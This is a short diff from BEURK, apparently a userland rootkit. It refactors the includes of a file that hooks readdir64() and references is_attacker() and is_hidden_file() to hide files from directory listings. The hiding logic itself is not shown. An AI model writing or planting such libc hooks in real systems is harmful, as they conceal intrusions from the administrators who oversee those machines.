@@ -18,10 +18,11 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#include <dirent.h> /* struct dirent, DIR */
+#include <dirent.h> /* struct dirent64, DIR */
 #include <string.h> /* strcmp() */
-#include "beurk.h" /* DEBUG(), is_attacker(), is_hidden_file() */
-#include "config.h" /* REAL_READDIR() */
+#include "beurk.h" /* is_attacker(), is_hidden_file() */
+#include "config.h" /* REAL_READDIR64() */
+#include "debug.h" /* DEBUG() */
 #include "hooks.h" /* prototype */
 
 struct dirent64         *readdir64(DIR *dirp) {
